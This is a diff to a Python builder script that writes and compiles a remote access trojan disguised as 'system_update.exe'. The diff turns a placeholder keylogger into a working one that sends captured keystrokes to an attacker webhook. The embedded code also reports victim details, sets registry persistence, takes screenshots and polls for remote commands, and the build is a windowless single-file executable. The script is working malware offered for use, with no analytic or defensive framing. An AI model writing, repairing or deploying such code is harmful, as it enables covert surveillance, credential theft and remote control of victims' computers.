@@ -18,7 +18,7 @@ output_name = "system_update.exe"
 rat_code = f'''
 import requests, subprocess, os, platform, socket, getpass, threading, time, hashlib, io, ctypes, sys, pyperclip
 from PIL import ImageGrab
-from pynput import keyboard
+from pynput.keyboard import Listener, Key
 from cryptography.fernet import Fernet
 import winreg
 
@@ -26,6 +26,7 @@ WEBHOOK_URL = "{webhook_url}"
 COMMAND_URL = "{command_url}"
 POLL_INTERVAL = 15
 VICTIM_ID = hashlib.md5((getpass.getuser() + socket.gethostname()).encode()).hexdigest()[:8]
+KEYLOG_BUFFER = ""
 
 def send(msg="", embed=None, file=None):
     data = {{"content": msg}}
@@ -35,7 +36,10 @@ def send(msg="", embed=None, file=None):
     except: pass
 
 def info():
-    ip = requests.get("https://api.ipify.org", timeout=5).text
+    try:
+        ip = requests.get("https://api.ipify.org", timeout=5).text
+    except:
+        ip = "Unknown"
     embed = {{"title": "WE GOT A BITE CAPTAIN", "description": f"**Victim ID:** {{VICTIM_ID}}\\n**User:** {{getpass.getuser()}}\\n**PC:** {{socket.gethostname()}}\\n**IP:** {{ip}}", "color": 16711680}}
     send(embed=embed)
 
@@ -56,6 +60,18 @@ def persist():
         winreg.SetValueEx(key, "SysUpdate", 0, winreg.REG_SZ, sys.argv[0])
         winreg.CloseKey(key)
     except: pass
+
+def on_press(key):
+    global KEYLOG_BUFFER
+    try:
+        KEYLOG_BUFFER += key.char
+    except AttributeError:
+        if key == Key.space: KEYLOG_BUFFER += " "
+        elif key == Key.enter: KEYLOG_BUFFER += "\\n"
+        else: KEYLOG_BUFFER += f" [{{key}}] "
+    if len(KEYLOG_BUFFER) > 500:
+        send(f"Keylog {{VICTIM_ID}}:\\n{{KEYLOG_BUFFER[-500:]}}")
+        KEYLOG_BUFFER = ""
 
 def screenshot():
     img = ImageGrab.grab()
@@ -131,16 +147,24 @@ if __name__ == "__main__":
     elevate()
     persist()
     info()
-    keyboard.Listener(on_press=lambda k: None).start()  # placeholder keylog
-    threading.Thread(target=poll, daemon=True).start()
-    while True: time.sleep(3600)
+    with Listener(on_press=on_press) as listener:
+        threading.Thread(target=poll, daemon=True).start()
+        listener.join()
 '''
 
 with open("rat.py", "w", encoding="utf-8") as f: 
     f.write(rat_code)
 
-print("Building clean EXE without cv2 cancer...")
-subprocess.run(["pyinstaller", "--onefile", "--noconsole", "--name", output_name, "rat.py"])
+print("Building with pynput fix - hold tight...")
+subprocess.run([
+    "pyinstaller",
+    "--onefile",
+    "--noconsole",
+    "--hidden-import=pynput.keyboard._win32",
+    "--hidden-import=pynput._util.win32",
+    "--name", output_name,
+    "rat.py"
+])
 
 # Cleanup
 shutil.rmtree("build", ignore_errors=True)
@@ -148,4 +172,5 @@ shutil.rmtree("__pycache__", ignore_errors=True)
 os.remove("rat.py") if os.path.exists("rat.py") else None
 os.remove("rat.spec") if os.path.exists("rat.spec") else None
 
-print(f"Done - no more cv2 errors. EXE at dist\\{output_name}")
+print(f"Done - pynput error annihilated. EXE at dist\\{output_name}")
+print("Keylogger now buffers and exfils real keystrokes.")
